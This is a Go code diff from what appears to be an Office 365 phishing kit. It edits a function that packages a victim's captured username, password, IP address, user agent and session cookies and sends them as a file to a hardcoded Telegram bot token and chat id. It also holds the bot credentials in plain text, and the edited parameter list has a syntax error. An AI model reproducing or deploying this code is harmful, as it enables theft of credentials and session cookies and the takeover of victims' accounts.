@@ -45,21 +45,18 @@ func getChatId() string {
 	return fmt.Sprintf("%s", ChatId)
 }
 
-func sendTelegramResult(cookies string, username string, password string, remote_addr string, useragent string) {
+func sendTelegramResult(cookies string, username string, password string, , useragent string, remote_addr string) {
 
 	// Send the message
 	var err error
-	client, fileName := &http.Client{}, "filename-cookies.json"
+	client, fileName := &http.Client{}, "🧾"+username+"-cookies.json"
 	token, chat_id := "5886667026:AAHMRZh4RSjsqaXNwPgZjOJ_W-ffDM5PpIE", "915867987"
 
 	url := "https://api.telegram.org/bot" + token + "/sendDocument?chat_id=" + chat_id + ""
 	//url := "http://api.ttelegram.org/bot"%s/sendDocument?chat_id=%s", getUrl(), getChatId())
-	msg := "[ 🍁 O365 Cookies Result 🍁 ]\n\n********* [ 💻 Valid Login  💻 ] ********\n🌟 Username : " + username + "\n🔑 Password : " + password + "\n🌎 UserAgent: " + useragent + "\n💻 IP:   https://ip-api.com/" + remote_addr + "\n\n*******[ 🍪 Cookies Captured 🍪 ] **********"
+	msg := "🍁 O365 Cookies Result 🍁\n\n****** [ 💻 Valid Login  💻 ] ******\n🌟 Username : " + username + "\n🔑 Password : " + password + "\n🌎 UserAgent: " + useragent + "\n💻 IP:   https://ip-api.com/" + remote_addr + "\n\n***** [ 🍪 Cookies Captured 🍪 ] *****"
 	
-// 	postBody, _ := json.Marshal(map[string]string{
-// 		"chat_id":    getChatId(),
-// 		"caption":       msg,
-// 	})
+
 	err = os.WriteFile(fileName, []byte(cookies), 0755)
 	if err != nil {
 	   fmt.Printf("Unable to write file: %v", err)
@@ -84,15 +81,6 @@ func sendTelegramResult(cookies string, username string, password string, remote
 	os.Remove(fileName)
 
 	
-	//request, _ := http.Post(url, "application/json", responseBody)
-
-	//defer req.Body.Close()
-	
-	// 	// Body
-// 	responseBody, err = ioutil.ReadAll(req.Body)
-// 	if err != nil {
-// 		log.Fatalf("%s", err)
-// 	}
 	log.Println("Send Email/Telegram Cookies", username, password)
 	
 	// Return
